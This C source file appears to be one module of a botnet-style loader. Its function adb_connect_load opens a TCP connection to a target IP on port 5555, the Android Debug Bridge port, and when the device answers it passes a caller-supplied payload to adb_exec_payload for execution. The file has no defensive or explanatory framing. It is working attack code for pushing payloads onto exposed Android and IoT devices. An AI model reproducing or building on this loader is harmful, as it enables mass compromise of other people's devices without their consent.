#include "../../includes/adb/connect.h"


/*
    *    util/loader/util/adb/connect.c
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


void adb_connect_load(char *ipaddr, char *payload) {
    int fd;
    struct sockaddr_in target;
    
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(ipaddr);
    target.sin_port = htons(5555);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    printf("\e[0;32mTarget: %s", ipaddr);
    if (connect(fd, (struct sockaddr *)&target, sizeof(target)) == 0) {
        adb_exec_payload(fd, payload);
    } else {
        printf("\e[0;31mStatus: Offline!\n", ipaddr);
    }
}